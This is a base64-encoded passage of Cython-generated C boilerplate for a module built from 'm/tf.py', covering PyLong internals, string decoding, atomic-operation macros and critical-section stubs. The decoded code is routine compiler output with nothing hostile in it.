iAgI2lmbmRlZiBfUHlMb25nX1NJR05fTUFTSwogICAgI2RlZmluZSBfUHlMb25nX1NJR05fTUFTSyAzCiAgI2VuZGlmCiAgI2lmbmRlZiBfUHlMb25nX05PTl9TSVpFX0JJVFMKICAgICNkZWZpbmUgX1B5TG9uZ19OT05fU0laRV9CSVRTIDMKICAjZW5kaWYKICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19TaWduKHgpICAoKChQeUxvbmdPYmplY3QqKXgpLT5sb25nX3ZhbHVlLmx2X3RhZyAmIF9QeUxvbmdfU0lHTl9NQVNLKQogICNkZWZpbmUgX19QeXhfUHlMb25nX0lzTmVnKHgpICAoKF9fUHl4X1B5TG9uZ19TaWduKHgpICYgMikgIT0gMCkKICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19Jc05vbk5lZyh4KSAgKCFfX1B5eF9QeUxvbmdfSXNOZWcoeCkpCiAgI2RlZmluZSBfX1B5eF9QeUxvbmdfSXNaZXJvKHgpICAoX19QeXhfUHlMb25nX1NpZ24oeCkgJiAxKQogICNkZWZpbmUgX19QeXhfUHlMb25nX0lzUG9zKHgpICAoX19QeXhfUHlMb25nX1NpZ24oeCkgPT0gMCkKICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19Db21wYWN0VmFsdWVVbnNpZ25lZCh4KSAgKF9fUHl4X1B5TG9uZ19EaWdpdHMoeClbMF0pCiAgI2RlZmluZSBfX1B5eF9QeUxvbmdfRGlnaXRDb3VudCh4KSAgKChQeV9zc2l6ZV90KSAoKChQeUxvbmdPYmplY3QqKXgpLT5sb25nX3ZhbHVlLmx2X3RhZyA+PiBfUHlMb25nX05PTl9TSVpFX0JJVFMpKQogICNkZWZpbmUgX19QeXhfUHlMb25nX1NpZ25lZERpZ2l0Q291bnQoeClcCiAgICAgICAgKCgxIC0gKFB5X3NzaXplX3QpIF9fUHl4X1B5TG9uZ19TaWduKHgpKSAqIF9fUHl4X1B5TG9uZ19EaWdpdENvdW50KHgpKQogICNpZiBkZWZpbmVkKFB5VW5zdGFibGVfTG9uZ19Jc0NvbXBhY3QpICYmIGRlZmluZWQoUHlVbnN0YWJsZV9Mb25nX0NvbXBhY3RWYWx1ZSkKICAgICNkZWZpbmUgX19QeXhfUHlMb25nX0lzQ29tcGFjdCh4KSAgICAgUHlVbnN0YWJsZV9Mb25nX0lzQ29tcGFjdCgoUHlMb25nT2JqZWN0KikgeCkKICAgICNkZWZpbmUgX19QeXhfUHlMb25nX0NvbXBhY3RWYWx1ZSh4KSAgUHlVbnN0YWJsZV9Mb25nX0NvbXBhY3RWYWx1ZSgoUHlMb25nT2JqZWN0KikgeCkKICAjZWxzZQogICAgI2RlZmluZSBfX1B5eF9QeUxvbmdfSXNDb21wYWN0KHgpICAgICAoKChQeUxvbmdPYmplY3QqKXgpLT5sb25nX3ZhbHVlLmx2X3RhZyA8ICgyIDw8IF9QeUxvbmdfTk9OX1NJWkVfQklUUykpCiAgICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19Db21wYWN0VmFsdWUoeCkgICgoMSAtIChQeV9zc2l6ZV90KSBfX1B5eF9QeUxvbmdfU2lnbih4KSkgKiAoUHlfc3NpemVfdCkgX19QeXhfUHlMb25nX0RpZ2l0cyh4KVswXSkKICAjZW5kaWYKICB0eXBlZGVmIFB5X3NzaXplX3QgIF9fUHl4X2NvbXBhY3RfcHlsb25nOwogIHR5cGVkZWYgc2l6ZV90ICBfX1B5eF9jb21wYWN0X3VweWxvbmc7CiAgI2Vsc2UKICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19Jc05lZyh4KSAgKFB5X1NJWkUoeCkgPCAwKQogICNkZWZpbmUgX19QeXhfUHlMb25nX0lzTm9uTmVnKHgpICAoUHlfU0laRSh4KSA+PSAwKQogICNkZWZpbmUgX19QeXhfUHlMb25nX0lzWmVybyh4KSAgKFB5X1NJWkUoeCkgPT0gMCkKICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19Jc1Bvcyh4KSAgKFB5X1NJWkUoeCkgPiAwKQogICNkZWZpbmUgX19QeXhfUHlMb25nX0NvbXBhY3RWYWx1ZVVuc2lnbmVkKHgpICAoKFB5X1NJWkUoeCkgPT0gMCkgPyAwIDogX19QeXhfUHlMb25nX0RpZ2l0cyh4KVswXSkKICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19EaWdpdENvdW50KHgpICBfX1B5eF9zc3RfYWJzKFB5X1NJWkUoeCkpCiAgI2RlZmluZSBfX1B5eF9QeUxvbmdfU2lnbmVkRGlnaXRDb3VudCh4KSAgUHlfU0laRSh4KQogICNkZWZpbmUgX19QeXhfUHlMb25nX0lzQ29tcGFjdCh4KSAgKFB5X1NJWkUoeCkgPT0gMCB8fCBQeV9TSVpFKHgpID09IDEgfHwgUHlfU0laRSh4KSA9PSAtMSkKICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19Db21wYWN0VmFsdWUoeClcCiAgICAgICAgKChQeV9TSVpFKHgpID09IDApID8gKHNkaWdpdCkgMCA6ICgoUHlfU0laRSh4KSA8IDApID8gLShzZGlnaXQpX19QeXhfUHlMb25nX0RpZ2l0cyh4KVswXSA6IChzZGlnaXQpX19QeXhfUHlMb25nX0RpZ2l0cyh4KVswXSkpCiAgdHlwZWRlZiBzZGlnaXQgIF9fUHl4X2NvbXBhY3RfcHlsb25nOwogIHR5cGVkZWYgZGlnaXQgIF9fUHl4X2NvbXBhY3RfdXB5bG9uZzsKICAjZW5kaWYKICBzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlMb25nX0NvbXBhY3RBc0xvbmcoUHlPYmplY3QgKngsIGxvbmcgKnJldHVybl92YWx1ZSk7CiAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwQTUKICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19EaWdpdHMoeCkgICgoKFB5TG9uZ09iamVjdCopeCktPmxvbmdfdmFsdWUub2JfZGlnaXQpCiAgI2Vsc2UKICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19EaWdpdHMoeCkgICgoKFB5TG9uZ09iamVjdCopeCktPm9iX2RpZ2l0KQogICNlbmRpZgojZW5kaWYKI2lmIF9fUFlYX0RFRkFVTFRfU1RSSU5HX0VOQ09ESU5HX0lTX1VURjgKICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9Gcm9tU3RyaW5nQW5kU2l6ZShjX3N0ciwgc2l6ZSkgUHlVbmljb2RlX0RlY29kZVVURjgoY19zdHIsIHNpemUsIE5VTEwpCiNlbGlmIF9fUFlYX0RFRkFVTFRfU1RSSU5HX0VOQ09ESU5HX0lTX0FTQ0lJCiAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfRnJvbVN0cmluZ0FuZFNpemUoY19zdHIsIHNpemUpIFB5VW5pY29kZV9EZWNvZGVBU0NJSShjX3N0ciwgc2l6ZSwgTlVMTCkKI2Vsc2UKICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9Gcm9tU3RyaW5nQW5kU2l6ZShjX3N0ciwgc2l6ZSkgUHlVbmljb2RlX0RlY29kZShjX3N0ciwgc2l6ZSwgX19QWVhfREVGQVVMVF9TVFJJTkdfRU5DT0RJTkcsIE5VTEwpCiNlbmRpZgoKCgojaWYgZGVmaW5lZChfX0dOVUNfXykgICAgICYmIChfX0dOVUNfXyA+IDIgfHwgKF9fR05VQ19fID09IDIgJiYgKF9fR05VQ19NSU5PUl9fID4gOTUpKSkKICAjZGVmaW5lIGxpa2VseSh4KSAgIF9fYnVpbHRpbl9leHBlY3QoISEoeCksIDEpCiAgI2RlZmluZSB1bmxpa2VseSh4KSBfX2J1aWx0aW5fZXhwZWN0KCEhKHgpLCAwKQojZWxzZSAKICAjZGVmaW5lIGxpa2VseSh4KSAgICh4KQogICNkZWZpbmUgdW5saWtlbHkoeCkgKHgpCiNlbmRpZiAKCiNpZmRlZiBfX2NwbHVzcGx1cwojaWYgX19jcGx1c3BsdXMgPiAyMDExMDNMCiNpbmNsdWRlIDx0eXBlX3RyYWl0cz4KI2VuZGlmCnRlbXBsYXRlIDx0eXBlbmFtZSBUPgpzdGF0aWMgdm9pZCBfX1B5eF9wcmV0ZW5kX3RvX2luaXRpYWxpemUoVCogcHRyKSB7CiNpZiBfX2NwbHVzcGx1cyA+IDIwMTEwM0wKICAgIGlmICgoc3RkOjppc190cml2aWFsbHlfZGVmYXVsdF9jb25zdHJ1Y3RpYmxlPFQ+Ojp2YWx1ZSkpCiNlbmRpZgogICAgICAgICpwdHIgPSBUKCk7CiAgICAodm9pZClwdHI7Cn0KI2Vsc2UKc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9wcmV0ZW5kX3RvX2luaXRpYWxpemUodm9pZCogcHRyKSB7ICh2b2lkKXB0cjsgfQojZW5kaWYKCgojaWYgIUNZVEhPTl9VU0VfTU9EVUxFX1NUQVRFCnN0YXRpYyBQeU9iamVjdCAqX19weXhfbSA9IE5VTEw7CiNlbmRpZgpzdGF0aWMgaW50IF9fcHl4X2xpbmVubzsKc3RhdGljIGludCBfX3B5eF9jbGluZW5vID0gMDsKc3RhdGljIGNvbnN0IGNoYXIgKiBjb25zdCBfX3B5eF9jZmlsZW5tID0gX19GSUxFX187CnN0YXRpYyBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZTsKCgoKc3RhdGljIGNvbnN0IGNoYXIqIGNvbnN0IF9fcHl4X2ZbXSA9IHsKICAibS90Zi5weSIsCn07CgoKI2luY2x1ZGUgPHB5dGhyZWFkLmg+CiNpZm5kZWYgQ1lUSE9OX0FUT01JQ1MKICAgICNkZWZpbmUgQ1lUSE9OX0FUT01JQ1MgMQojZW5kaWYKI2RlZmluZSBfX1BZWF9DWVRIT05fQVRPTUlDU19FTkFCTEVEKCkgQ1lUSE9OX0FUT01JQ1MKI2RlZmluZSBfX1BZWF9HRVRfQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkcoKSBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElORwojZGVmaW5lIF9fcHl4X2F0b21pY19pbnRfdHlwZSBpbnQKI2RlZmluZSBfX3B5eF9ub25hdG9taWNfaW50X3R5cGUgaW50CiNpZiBDWVRIT05fQVRPTUlDUyAmJiAoZGVmaW5lZChfX1NURENfVkVSU0lPTl9fKSAmJlwKICAgICAgICAgICAgICAgICAgICAgICAgKF9fU1REQ19WRVJTSU9OX18gPj0gMjAxMTEyTCkgJiZcCiAgICAgICAgICAgICAgICAgICAgICAgICFkZWZpbmVkKF9fU1REQ19OT19BVE9NSUNTX18pKQogICAgI2luY2x1ZGUgPHN0ZGF0b21pYy5oPgojZWxpZiBDWVRIT05fQVRPTUlDUyAmJiAoZGVmaW5lZChfX2NwbHVzcGx1cykgJiYgKFwKICAgICAgICAgICAgICAgICAgICAoX19jcGx1c3BsdXMgPj0gMjAxMTAzTCkgfHxcCiAgICAgICAgICAgICAgICAgICAgKGRlZmluZWQoX01TQ19WRVIpICYmIF9NU0NfVkVSID49IDE3MDApKSkKICAgICNpbmNsdWRlIDxhdG9taWM+CiNlbmRpZgojaWYgQ1lUSE9OX0FUT01JQ1MgJiYgKGRlZmluZWQoX19TVERDX1ZFUlNJT05fXykgJiZcCiAgICAgICAgICAgICAgICAgICAgICAgIChfX1NURENfVkVSU0lPTl9fID49IDIwMTExMkwpICYmXAogICAgICAgICAgICAgICAgICAgICAgICAhZGVmaW5lZChfX1NURENfTk9fQVRPTUlDU19fKSAmJlwKICAgICAgICAgICAgICAgICAgICAgICBBVE9NSUNfSU5UX0xPQ0tfRlJFRSA9PSAyKQogICAgI3VuZGVmIF9fcHl4X2F0b21pY19pbnRfdHlwZQogICAgI2RlZmluZSBfX3B5eF9hdG9taWNfaW50X3R5cGUgYXRvbWljX2ludAogICAgI2RlZmluZSBfX3B5eF9hdG9taWNfcHRyX3R5cGUgYXRvbWljX3VpbnRwdHJfdAogICAgI2RlZmluZSBfX3B5eF9ub25hdG9taWNfcHRyX3R5cGUgdWludHB0cl90CiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19pbmNyX3JlbGF4ZWQodmFsdWUpIGF0b21pY19mZXRjaF9hZGRfZXhwbGljaXQodmFsdWUsIDEsIG1lbW9yeV9vcmRlcl9yZWxheGVkKQogICAgI2RlZmluZSBfX3B5eF9hdG9taWNfaW5jcl9hY3FfcmVsKHZhbHVlKSBhdG9taWNfZmV0Y2hfYWRkX2V4cGxpY2l0KHZhbHVlLCAxLCBtZW1vcnlfb3JkZXJfYWNxX3JlbCkKICAgICNkZWZpbmUgX19weXhfYXRvbWljX2RlY3JfYWNxX3JlbCh2YWx1ZSkgYXRvbWljX2ZldGNoX3N1Yl9leHBsaWNpdCh2YWx1ZSwgMSwgbWVtb3J5X29yZGVyX2FjcV9yZWwpCiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19zdWIodmFsdWUsIGFyZykgYXRvbWljX2ZldGNoX3N1Yih2YWx1ZSwgYXJnKQogICAgI2RlZmluZSBfX3B5eF9hdG9taWNfaW50X2NtcF9leGNoYW5nZSh2YWx1ZSwgZXhwZWN0ZWQsIGRlc2lyZWQpIGF0b21pY19jb21wYXJlX2V4Y2hhbmdlX3N0cm9uZyh2YWx1ZSwgZXhwZWN0ZWQsIGRlc2lyZWQpCiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19sb2FkKHZhbHVlKSBhdG9taWNfbG9hZCh2YWx1ZSkKICAgICNkZWZpbmUgX19weXhfYXRvbWljX3N0b3JlKHZhbHVlLCBuZXdfdmFsdWUpIGF0b21pY19zdG9yZSh2YWx1ZSwgbmV3X3ZhbHVlKQogICAgI2RlZmluZSBfX3B5eF9hdG9taWNfcG9pbnRlcl9sb2FkX3JlbGF4ZWQodmFsdWUpIGF0b21pY19sb2FkX2V4cGxpY2l0KHZhbHVlLCBtZW1vcnlfb3JkZXJfcmVsYXhlZCkKICAgICNkZWZpbmUgX19weXhfYXRvbWljX3BvaW50ZXJfbG9hZF9hY3F1aXJlKHZhbHVlKSBhdG9taWNfbG9hZF9leHBsaWNpdCh2YWx1ZSwgbWVtb3J5X29yZGVyX2FjcXVpcmUpCiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19wb2ludGVyX2V4Y2hhbmdlKHZhbHVlLCBuZXdfdmFsdWUpIGF0b21pY19leGNoYW5nZSh2YWx1ZSwgKF9fcHl4X25vbmF0b21pY19wdHJfdHlwZSluZXdfdmFsdWUpCiAgICAjaWYgZGVmaW5lZChfX1BZWF9ERUJVR19BVE9NSUNTKSAmJiBkZWZpbmVkKF9NU0NfVkVSKQogICAgICAgICNwcmFnbWEgbWVzc2FnZSAoIlVzaW5nIHN0YW5kYXJkIEMgYXRvbWljcyIpCiAgICAjZWxpZiBkZWZpbmVkKF9fUFlYX0RFQlVHX0FUT01JQ1MpCiAgICAgICAgI3dhcm5pbmcgIlVzaW5nIHN0YW5kYXJkIEMgYXRvbWljcyIKICAgICNlbmRpZgojZWxpZiBDWVRIT05fQVRPTUlDUyAmJiAoZGVmaW5lZChfX2NwbHVzcGx1cykgJiYgKFwKICAgICAgICAgICAgICAgICAgICAoX19jcGx1c3BsdXMgPj0gMjAxMTAzTCkgfHxcClwKICAgICAgICAgICAgICAgICAgICAoZGVmaW5lZChfTVNDX1ZFUikgJiYgX01TQ19WRVIgPj0gMTcwMCkpICYmXAogICAgICAgICAgICAgICAgICAgIEFUT01JQ19JTlRfTE9DS19GUkVFID09IDIpCiAgICAjdW5kZWYgX19weXhfYXRvbWljX2ludF90eXBlCiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19pbnRfdHlwZSBzdGQ6OmF0b21pY19pbnQKICAgICNkZWZpbmUgX19weXhfYXRvbWljX3B0cl90eXBlIHN0ZDo6YXRvbWljX3VpbnRwdHJfdAogICAgI2RlZmluZSBfX3B5eF9ub25hdG9taWNfcHRyX3R5cGUgdWludHB0cl90CiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19pbmNyX3JlbGF4ZWQodmFsdWUpIHN0ZDo6YXRvbWljX2ZldGNoX2FkZF9leHBsaWNpdCh2YWx1ZSwgMSwgc3RkOjptZW1vcnlfb3JkZXJfcmVsYXhlZCkKICAgICNkZWZpbmUgX19weXhfYXRvbWljX2luY3JfYWNxX3JlbCh2YWx1ZSkgc3RkOjphdG9taWNfZmV0Y2hfYWRkX2V4cGxpY2l0KHZhbHVlLCAxLCBzdGQ6Om1lbW9yeV9vcmRlcl9hY3FfcmVsKQogICAgI2RlZmluZSBfX3B5eF9hdG9taWNfZGVjcl9hY3FfcmVsKHZhbHVlKSBzdGQ6OmF0b21pY19mZXRjaF9zdWJfZXhwbGljaXQodmFsdWUsIDEsIHN0ZDo6bWVtb3J5X29yZGVyX2FjcV9yZWwpCiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19zdWIodmFsdWUsIGFyZykgc3RkOjphdG9taWNfZmV0Y2hfc3ViKHZhbHVlLCBhcmcpCiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19pbnRfY21wX2V4Y2hhbmdlKHZhbHVlLCBleHBlY3RlZCwgZGVzaXJlZCkgc3RkOjphdG9taWNfY29tcGFyZV9leGNoYW5nZV9zdHJvbmcodmFsdWUsIGV4cGVjdGVkLCBkZXNpcmVkKQogICAgI2RlZmluZSBfX3B5eF9hdG9taWNfbG9hZCh2YWx1ZSkgc3RkOjphdG9taWNfbG9hZCh2YWx1ZSkKICAgICNkZWZpbmUgX19weXhfYXRvbWljX3N0b3JlKHZhbHVlLCBuZXdfdmFsdWUpIHN0ZDo6YXRvbWljX3N0b3JlKHZhbHVlLCBuZXdfdmFsdWUpCiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19wb2ludGVyX2xvYWRfcmVsYXhlZCh2YWx1ZSkgc3RkOjphdG9taWNfbG9hZF9leHBsaWNpdCh2YWx1ZSwgc3RkOjptZW1vcnlfb3JkZXJfcmVsYXhlZCkKICAgICNkZWZpbmUgX19weXhfYXRvbWljX3BvaW50ZXJfbG9hZF9hY3F1aXJlKHZhbHVlKSBzdGQ6OmF0b21pY19sb2FkX2V4cGxpY2l0KHZhbHVlLCBzdGQ6Om1lbW9yeV9vcmRlcl9hY3F1aXJlKQogICAgI2RlZmluZSBfX3B5eF9hdG9taWNfcG9pbnRlcl9leGNoYW5nZSh2YWx1ZSwgbmV3X3ZhbHVlKSBzdGQ6OmF0b21pY19leGNoYW5nZSh2YWx1ZSwgKF9fcHl4X25vbmF0b21pY19wdHJfdHlwZSluZXdfdmFsdWUpCiAgICAjaWYgZGVmaW5lZChfX1BZWF9ERUJVR19BVE9NSUNTKSAmJiBkZWZpbmVkKF9NU0NfVkVSKQogICAgICAgICNwcmFnbWEgbWVzc2FnZSAoIlVzaW5nIHN0YW5kYXJkIEMrKyBhdG9taWNzIikKICAgICNlbGlmIGRlZmluZWQoX19QWVhfREVCVUdfQVRPTUlDUykKICAgICAgICAjd2FybmluZyAiVXNpbmcgc3RhbmRhcmQgQysrIGF0b21pY3MiCiAgICAjZW5kaWYKI2VsaWYgQ1lUSE9OX0FUT01JQ1MgJiYgKF9fR05VQ19fID49IDUgfHwgKF9fR05VQ19fID09IDQgJiZcCiAgICAgICAgICAgICAgICAgICAgKF9fR05VQ19NSU5PUl9fID4gMSB8fFwKICAgICAgICAgICAgICAgICAgICAoX19HTlVDX01JTk9SX18gPT0gMSAmJiBfX0dOVUNfUEFUQ0hMRVZFTF9fID49IDIpKSkpCiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19wdHJfdHlwZSB2b2lkKgogICAgI2RlZmluZSBfX3B5eF9hdG9taWNfaW5jcl9yZWxheGVkKHZhbHVlKSBfX3N5bmNfZmV0Y2hfYW5kX2FkZCh2YWx1ZSwgMSkKICAgICNkZWZpbmUgX19weXhfYXRvbWljX2luY3JfYWNxX3JlbCh2YWx1ZSkgX19zeW5jX2ZldGNoX2FuZF9hZGQodmFsdWUsIDEpCiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19kZWNyX2FjcV9yZWwodmFsdWUpIF9fc3luY19mZXRjaF9hbmRfc3ViKHZhbHVlLCAxKQogICAgI2RlZmluZSBfX3B5eF9hdG9taWNfc3ViKHZhbHVlLCBhcmcpIF9fc3luY19mZXRjaF9hbmRfc3ViKHZhbHVlLCBhcmcpCiAgICBzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19weXhfYXRvbWljX2ludF9jbXBfZXhjaGFuZ2UoX19weXhfYXRvbWljX2ludF90eXBlKiB2YWx1ZSwgX19weXhfbm9uYXRvbWljX2ludF90eXBlKiBleHBlY3RlZCwgX19weXhfbm9uYXRvbWljX2ludF90eXBlIGRlc2lyZWQpIHsKICAgICAgICBfX3B5eF9ub25hdG9taWNfaW50X3R5cGUgb2xkID0gX19zeW5jX3ZhbF9jb21wYXJlX2FuZF9zd2FwKHZhbHVlLCAqZXhwZWN0ZWQsIGRlc2lyZWQpOwogICAgICAgIGludCByZXN1bHQgPSBvbGQgPT0gKmV4cGVjdGVkOwogICAgICAgICpleHBlY3RlZCA9IG9sZDsKICAgICAgICByZXR1cm4gcmVzdWx0OwogICAgfQogICAgI2RlZmluZSBfX3B5eF9hdG9taWNfbG9hZCh2YWx1ZSkgX19zeW5jX2ZldGNoX2FuZF9hZGQodmFsdWUsIDApCiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19zdG9yZSh2YWx1ZSwgbmV3X3ZhbHVlKSBfX3N5bmNfbG9ja190ZXN0X2FuZF9zZXQodmFsdWUsIG5ld192YWx1ZSkKICAgICNkZWZpbmUgX19weXhfYXRvbWljX3BvaW50ZXJfbG9hZF9yZWxheGVkKHZhbHVlKSBfX3N5bmNfZmV0Y2hfYW5kX2FkZCh2YWx1ZSwgMCkKICAgICNkZWZpbmUgX19weXhfYXRvbWljX3BvaW50ZXJfbG9hZF9hY3F1aXJlKHZhbHVlKSBfX3N5bmNfZmV0Y2hfYW5kX2FkZCh2YWx1ZSwgMCkKICAgICNkZWZpbmUgX19weXhfYXRvbWljX3BvaW50ZXJfZXhjaGFuZ2UodmFsdWUsIG5ld192YWx1ZSkgX19zeW5jX2xvY2tfdGVzdF9hbmRfc2V0KHZhbHVlLCAoX19weXhfYXRvbWljX3B0cl90eXBlKW5ld192YWx1ZSkKICAgICNpZmRlZiBfX1BZWF9ERUJVR19BVE9NSUNTCiAgICAgICAgI3dhcm5pbmcgIlVzaW5nIEdOVSBhdG9taWNzIgogICAgI2VuZGlmCiNlbGlmIENZVEhPTl9BVE9NSUNTICYmIGRlZmluZWQoX01TQ19WRVIpCiAgICAjaW5jbHVkZSA8aW50cmluLmg+CiAgICAjdW5kZWYgX19weXhfYXRvbWljX2ludF90eXBlCiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19pbnRfdHlwZSBsb25nCiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19wdHJfdHlwZSB2b2lkKgogICAgI3VuZGVmIF9fcHl4X25vbmF0b21pY19pbnRfdHlwZQogICAgI2RlZmluZSBfX3B5eF9ub25hdG9taWNfaW50X3R5cGUgbG9uZwogICAgI3ByYWdtYSBpbnRyaW5zaWMgKF9JbnRlcmxvY2tlZEV4Y2hhbmdlQWRkLCBfSW50ZXJsb2NrZWRFeGNoYW5nZSwgX0ludGVybG9ja2VkQ29tcGFyZUV4Y2hhbmdlLCBfSW50ZXJsb2NrZWRDb21wYXJlRXhjaGFuZ2VQb2ludGVyLCBfSW50ZXJsb2NrZWRFeGNoYW5nZVBvaW50ZXIpCiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19pbmNyX3JlbGF4ZWQodmFsdWUpIF9JbnRlcmxvY2tlZEV4Y2hhbmdlQWRkKHZhbHVlLCAxKQogICAgI2RlZmluZSBfX3B5eF9hdG9taWNfaW5jcl9hY3FfcmVsKHZhbHVlKSBfSW50ZXJsb2NrZWRFeGNoYW5nZUFkZCh2YWx1ZSwgMSkKICAgICNkZWZpbmUgX19weXhfYXRvbWljX2RlY3JfYWNxX3JlbCh2YWx1ZSkgX0ludGVybG9ja2VkRXhjaGFuZ2VBZGQodmFsdWUsIC0xKQogICAgI2RlZmluZSBfX3B5eF9hdG9taWNfc3ViKHZhbHVlLCBhcmcpIF9JbnRlcmxvY2tlZEV4Y2hhbmdlQWRkKHZhbHVlLCAtYXJnKQogICAgc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fcHl4X2F0b21pY19pbnRfY21wX2V4Y2hhbmdlKF9fcHl4X2F0b21pY19pbnRfdHlwZSogdmFsdWUsIF9fcHl4X25vbmF0b21pY19pbnRfdHlwZSogZXhwZWN0ZWQsIF9fcHl4X25vbmF0b21pY19pbnRfdHlwZSBkZXNpcmVkKSB7CiAgICAgICAgX19weXhfbm9uYXRvbWljX2ludF90eXBlIG9sZCA9IF9JbnRlcmxvY2tlZENvbXBhcmVFeGNoYW5nZSh2YWx1ZSwgZGVzaXJlZCwgKmV4cGVjdGVkKTsKICAgICAgICBpbnQgcmVzdWx0ID0gb2xkID09ICpleHBlY3RlZDsKICAgICAgICAqZXhwZWN0ZWQgPSBvbGQ7CiAgICAgICAgcmV0dXJuIHJlc3VsdDsKICAgIH0KICAgICNkZWZpbmUgX19weXhfYXRvbWljX2xvYWQodmFsdWUpIF9JbnRlcmxvY2tlZEV4Y2hhbmdlQWRkKHZhbHVlLCAwKQogICAgI2RlZmluZSBfX3B5eF9hdG9taWNfc3RvcmUodmFsdWUsIG5ld192YWx1ZSkgX0ludGVybG9ja2VkRXhjaGFuZ2UodmFsdWUsIG5ld192YWx1ZSkKICAgICNkZWZpbmUgX19weXhfYXRvbWljX3BvaW50ZXJfbG9hZF9yZWxheGVkKHZhbHVlKSAqKHZvaWQgKiB2b2xhdGlsZSAqKXZhbHVlCiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19wb2ludGVyX2xvYWRfYWNxdWlyZSh2YWx1ZSkgX0ludGVybG9ja2VkQ29tcGFyZUV4Y2hhbmdlUG9pbnRlcih2YWx1ZSwgMCwgMCkKICAgICNkZWZpbmUgX19weXhfYXRvbWljX3BvaW50ZXJfZXhjaGFuZ2UodmFsdWUsIG5ld192YWx1ZSkgX0ludGVybG9ja2VkRXhjaGFuZ2VQb2ludGVyKHZhbHVlLCAoX19weXhfYXRvbWljX3B0cl90eXBlKW5ld192YWx1ZSkKICAgICNpZmRlZiBfX1BZWF9ERUJVR19BVE9NSUNTCiAgICAgICAgI3ByYWdtYSBtZXNzYWdlICgiVXNpbmcgTVNWQyBhdG9taWNzIikKICAgICNlbmRpZgojZWxzZQogICAgI3VuZGVmIENZVEhPTl9BVE9NSUNTCiAgICAjZGVmaW5lIENZVEhPTl9BVE9NSUNTIDAKICAgICNpZmRlZiBfX1BZWF9ERUJVR19BVE9NSUNTCiAgICAgICAgI3dhcm5pbmcgIk5vdCB1c2luZyBhdG9taWNzIgogICAgI2VuZGlmCiNlbmRpZgojaWYgQ1lUSE9OX0FUT01JQ1MKICAgICNkZWZpbmUgX19weXhfYWRkX2FjcXVpc2l0aW9uX2NvdW50KG1lbXZpZXcpXAogICAgICAgICAgICAgX19weXhfYXRvbWljX2luY3JfcmVsYXhlZChfX3B5eF9nZXRfc2xpY2VfY291bnRfcG9pbnRlcihtZW12aWV3KSkKICAgICNkZWZpbmUgX19weXhfc3ViX2FjcXVpc2l0aW9uX2NvdW50KG1lbXZpZXcpXAogICAgICAgICAgICBfX3B5eF9hdG9taWNfZGVjcl9hY3FfcmVsKF9fcHl4X2dldF9zbGljZV9jb3VudF9wb2ludGVyKG1lbXZpZXcpKQojZWxzZQogICAgI2RlZmluZSBfX3B5eF9hZGRfYWNxdWlzaXRpb25fY291bnQobWVtdmlldylcCiAgICAgICAgICAgIF9fcHl4X2FkZF9hY3F1aXNpdGlvbl9jb3VudF9sb2NrZWQoX19weXhfZ2V0X3NsaWNlX2NvdW50X3BvaW50ZXIobWVtdmlldyksIG1lbXZpZXctPmxvY2spCiAgICAjZGVmaW5lIF9fcHl4X3N1Yl9hY3F1aXNpdGlvbl9jb3VudChtZW12aWV3KVwKICAgICAgICAgICAgX19weXhfc3ViX2FjcXVpc2l0aW9uX2NvdW50X2xvY2tlZChfX3B5eF9nZXRfc2xpY2VfY291bnRfcG9pbnRlcihtZW12aWV3KSwgbWVtdmlldy0+bG9jaykKI2VuZGlmCgoKI2luY2x1ZGUgPHN0cnVjdG1lbWJlci5oPgoKCiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkcKI2RlZmluZSBfX1B5eF9QeUNyaXRpY2FsU2VjdGlvbiB2b2lkKgojZGVmaW5lIF9fUHl4X1B5Q3JpdGljYWxTZWN0aW9uMiB2b2lkKgojZGVmaW5lIF9fUHl4X1B5Q3JpdGljYWxTZWN0aW9uX0JlZ2luMShjcywgYXJnKSAodm9pZCljcwojZGVmaW5lIF9fUHl4X1B5Q3JpdGljYWxTZWN0aW9uX0JlZ2luMihjcywgYXJnMSwgYXJnMikgKHZvaWQpY3MKI2RlZmluZSBfX1B5eF9QeUNyaXRpY2FsU2VjdGlvbl9FbmQxKGNzKQojZGVmaW5lIF9fUHl4X1B5Q3JpdGljYWxTZWN0aW9uX0VuZDIoY3MpCiNlbHNlCiNkZWZpbmUgX19QeXhfUHlDcml0aWNhbFNlY3Rpb24gUHlDcml0aWNhbFNlY3Rpb24KI2RlZmluZSBfX1B5eF9QeUNyaXRpY2FsU2VjdGlvbjIgUHlDcml0aWNhbFNlY3Rpb24yCiNkZWZpbmUgX1